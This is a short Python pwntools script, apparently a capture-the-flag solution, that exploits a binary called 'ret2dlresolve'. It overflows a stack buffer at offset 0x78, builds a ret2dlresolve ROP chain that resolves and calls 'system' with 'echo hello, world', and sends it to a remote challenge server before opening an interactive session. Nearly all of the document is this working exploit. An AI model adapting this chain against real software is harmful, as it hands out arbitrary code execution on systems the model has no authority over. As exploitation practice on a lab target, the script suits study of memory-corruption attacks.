from pwn import *

elf = ELF("./ret2dlresolve")
context.arch = "amd64"
rop = ROP("./ret2dlresolve")
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo hello, world"])
rop.read(0, dlresolve.data_addr)  # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())

ret = 0x000000000040101a

# p = elf.process()
p = remote("node4.buuoj.cn", 26221)

p.sendline(fit({0x78: p64(ret) + raw_rop, 256: dlresolve.payload}))
p.interactive()